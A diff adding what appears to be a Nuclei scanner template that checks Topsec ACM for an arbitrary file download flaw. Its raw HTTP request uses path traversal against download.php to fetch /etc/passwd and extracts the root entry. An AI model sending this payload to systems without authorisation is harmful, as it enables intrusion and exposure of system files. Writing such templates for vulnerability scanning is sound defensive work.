@@ -1,0 +1,30 @@
+id: topsec-acm-file-download
+info:
+  name: Topsec ACM Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Topsec ACM has an arbitrary file download vulnerability in the `download.php` file, allowing attackers to read arbitrary files from the system.
+  reference:
+    - http://dtcxdz.com/goods.php?id=3018
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /view/action/download.php?filename=../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/root:"
+          - "/bin/sh"
+        part: body
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "/root:[^\n]*"
